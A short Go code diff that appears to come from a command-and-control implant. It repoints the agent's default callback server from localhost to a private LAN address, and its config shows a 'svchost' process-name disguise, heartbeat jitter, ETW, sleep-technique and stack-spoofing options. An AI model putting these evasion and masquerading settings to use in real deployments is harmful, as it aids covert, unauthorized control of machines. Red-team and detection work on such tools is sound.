@@ -47,7 +47,7 @@ type AgentConfig struct {
 // DefaultAgentConfig 返回 Agent 的默认配置。
 func DefaultAgentConfig() *AgentConfig {
 	return &AgentConfig{
-		ServerURL:         "http://127.0.0.1:8443",
+		ServerURL:         "http://192.168.43.2:8443",
 		HeartbeatInterval: 10,
 		HeartbeatJitter:   5,
 		ProcessName:       "svchost",
@@ -67,7 +67,7 @@ func DefaultAgentConfig() *AgentConfig {
 		ETWEnabled:       true,
 		SleepTechnique:   "none",
 		StackSpoof:       false,
-		ServerURLs:       []string{"http://127.0.0.1:8443"},
+		ServerURLs:       []string{"http://192.168.43.2:8443"},
 		RotationStrategy: "failover",
 		TransportType:    "http",
 	}
